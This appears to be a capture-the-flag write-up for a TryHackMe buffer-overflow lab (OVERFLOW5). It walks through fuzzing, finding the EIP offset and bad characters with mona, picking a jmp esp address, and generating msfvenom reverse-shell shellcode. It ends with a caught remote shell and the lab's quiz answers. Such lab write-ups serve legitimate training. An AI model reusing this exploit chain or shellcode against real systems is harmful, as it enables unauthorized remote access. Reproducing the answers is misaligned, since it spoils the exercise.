# OVERFLOW5
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing crashed at 400 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ cyclic 800
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaah
```
Crashes with `61656461` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ python -c 'print(bytes.fromhex("61656461")[::-1].decode())'
adea
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ cyclic -l adea
314
```
## Finding Bad Chars
Generate bytearray in Immunity:
```
!mona bytearray -b "\x00"
```
Create chars for `exploit.py`
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
After re-running I do a comparison of the bytearray in Immunity:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0193FA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0193fa30                 Corruption after 21 bytes  00 16 17 2f 30 f4 f5 fd    normal                     Stack
```
The bad chars appear to be `\x00\x16\x2f\xf4\xfd`. Confirmed this and the comparison status is "Unmodified".
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x16\x2f\xf4\xfd"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

```
Jump address will be `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of c file: 1514 bytes
unsigned char buf[] =
"\xfc\xbb\x85\x72\x56\x85\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x79\x9a\xd4"
"\x85\x81\x5b\xb9\x0c\x64\x6a\xf9\x6b\xed\xdd\xc9\xf8\xa3"
"\xd1\xa2\xad\x57\x61\xc6\x79\x58\xc2\x6d\x5c\x57\xd3\xde"
"\x9c\xf6\x57\x1d\xf1\xd8\x66\xee\x04\x19\xae\x13\xe4\x4b"
"\x67\x5f\x5b\x7b\x0c\x15\x60\xf0\x5e\xbb\xe0\xe5\x17\xba"
"\xc1\xb8\x2c\xe5\xc1\x3b\xe0\x9d\x4b\x23\xe5\x98\x02\xd8"
"\xdd\x57\x95\x08\x2c\x97\x3a\x75\x80\x6a\x42\xb2\x27\x95"
"\x31\xca\x5b\x28\x42\x09\x21\xf6\xc7\x89\x81\x7d\x7f\x75"
"\x33\x51\xe6\xfe\x3f\x1e\x6c\x58\x5c\xa1\xa1\xd3\x58\x2a"
"\x44\x33\xe9\x68\x63\x97\xb1\x2b\x0a\x8e\x1f\x9d\x33\xd0"
"\xff\x42\x96\x9b\x12\x96\xab\xc6\x7a\x5b\x86\xf8\x7a\xf3"
"\x91\x8b\x48\x5c\x0a\x03\xe1\x15\x94\xd4\x06\x0c\x60\x4a"
"\xf9\xaf\x91\x43\x3e\xfb\xc1\xfb\x97\x84\x89\xfb\x18\x51"
"\x1d\xab\xb6\x0a\xde\x1b\x77\xfb\xb6\x71\x78\x24\xa6\x7a"
"\x52\x4d\x4d\x81\x35\x78\x94\x9e\xc4\x14\x9a\xa0\xd7\xb8"
"\x13\x46\xbd\x50\x72\xd1\x2a\xc8\xdf\xa9\xcb\x15\xca\xd4"
"\xcc\x9e\xf9\x29\x82\x56\x77\x39\x73\x97\xc2\x63\xd2\xa8"
"\xf8\x0b\xb8\x3b\x67\xcb\xb7\x27\x30\x9c\x90\x96\x49\x48"
"\x0d\x80\xe3\x6e\xcc\x54\xcb\x2a\x0b\xa5\xd2\xb3\xde\x91"
"\xf0\xa3\x26\x19\xbd\x97\xf6\x4c\x6b\x41\xb1\x26\xdd\x3b"
"\x6b\x94\xb7\xab\xea\xd6\x07\xad\xf2\x32\xfe\x51\x42\xeb"
"\x47\x6e\x6b\x7b\x40\x17\x91\x1b\xaf\xc2\x11\x3b\x52\xc6"
"\x6f\xd4\xcb\x83\xcd\xb9\xeb\x7e\x11\xc4\x6f\x8a\xea\x33"
"\x6f\xff\xef\x78\x37\xec\x9d\x11\xd2\x12\x31\x11\xf7\x12"
"\xb5\xed\xf8";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 5$ nc -lnvp 4444
Connection from 10.10.175.52:49315
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED OVERFLOW5
echo PWNED OVERFLOW5
PWNED OVERFLOW5

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW5?
```
314
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW5?
```
\x00\x16\x2f\xf4\xfd
```